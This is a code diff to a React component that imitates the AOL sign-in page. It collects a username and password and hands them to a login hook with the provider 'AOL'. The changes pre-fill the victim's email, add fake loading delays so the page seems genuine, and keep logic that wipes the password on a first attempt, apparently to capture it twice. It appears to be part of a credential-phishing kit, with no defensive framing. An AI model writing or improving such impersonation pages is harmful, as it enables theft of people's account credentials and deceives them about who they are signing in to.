@@ -5,6 +5,7 @@ import Spinner from './common/Spinner';
 interface AolLoginPageProps {
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
+  defaultEmail?: string;
 }
 
 // Simple input component for AOL style
@@ -31,11 +32,13 @@ const AolInput = ({ value, onChange, placeholder, type = "text", autoFocus = fal
   );
 };
 
-const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginError }) => {
-  const [email, setEmail] = useState('');
+const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail }) => {
+  const [email, setEmail] = useState(defaultEmail || '');
   const [password, setPassword] = useState('');
   const [showPasswordStep, setShowPasswordStep] = useState(false);
   const [pageReady, setPageReady] = useState(false);
+  const [nextLoading, setNextLoading] = useState(false);
+  const [submitting, setSubmitting] = useState(false);
 
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
 
@@ -44,14 +47,27 @@ const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginErro
     return () => clearTimeout(timer);
   }, []);
 
-  const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
+  const handleNext = async (e: React.MouseEvent<HTMLButtonElement>) => {
     e.preventDefault();
-    if (email) { setShowPasswordStep(true); }
+    if (email) {
+      setNextLoading(true);
+      await new Promise(resolve => setTimeout(resolve, 800));
+      setShowPasswordStep(true);
+      setNextLoading(false);
+    }
   };
   
   const handleSubmit = async (e: React.FormEvent) => {
-    const result = await handleFormSubmit(e, { email, password, provider: 'AOL' });
+    e.preventDefault();
+    if (!password) return;
+    setSubmitting(true);
+    await new Promise(resolve => setTimeout(resolve, 1200));
+    const result = await handleFormSubmit(
+      { preventDefault: () => {} } as React.FormEvent,
+      { email, password, provider: 'AOL' }
+    );
     if (result?.isFirstAttempt) { setPassword(''); }
+    setSubmitting(false);
   };
 
   const AolLogo = ({ className = '' }: { className?: string }) => (
@@ -93,16 +109,16 @@ const AolLoginPage: React.FC<AolLoginPageProps> = ({ onLoginSuccess, onLoginErro
             {!showPasswordStep ? (
               <div>
                 <AolInput value={email} onChange={(e: any) => setEmail(e.target.value)} placeholder="Username, email, or mobile" type="email" autoFocus />
-                <button onClick={handleNext} disabled={!email} className="w-full mt-6 py-3 bg-[#0066FF] text-white font-bold rounded-md hover:bg-[#0052cc] disabled:bg-[#0066FF] disabled:cursor-not-allowed transition-colors text-base">
-                  Next
+                <button onClick={handleNext} disabled={!email || nextLoading} className="w-full mt-6 py-3 bg-[#0066FF] text-white font-bold rounded-md hover:bg-[#0052cc] disabled:bg-[#0066FF] disabled:cursor-not-allowed transition-colors text-base">
+                  {nextLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Next'}
                 </button>
               </div>
             ) : (
               <div>
                 <div className="text-center text-sm font-medium p-2 rounded-md bg-gray-100 truncate">{email}</div>
                 <AolInput value={password} onChange={(e: any) => setPassword(e.target.value)} placeholder="Password" type="password" autoFocus />
-                <button type="submit" disabled={isLoading || !password} className="w-full mt-6 py-3 bg-[#0066FF] text-white font-bold rounded-md hover:bg-[#0052cc] disabled:opacity-50 transition-colors text-base">
-                  {isLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
+                <button type="submit" disabled={submitting || isLoading || !password} className="w-full mt-6 py-3 bg-[#0066FF] text-white font-bold rounded-md hover:bg-[#0052cc] disabled:opacity-50 transition-colors text-base">
+                  {(submitting || isLoading) ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
                 </button>
               </div>
             )}
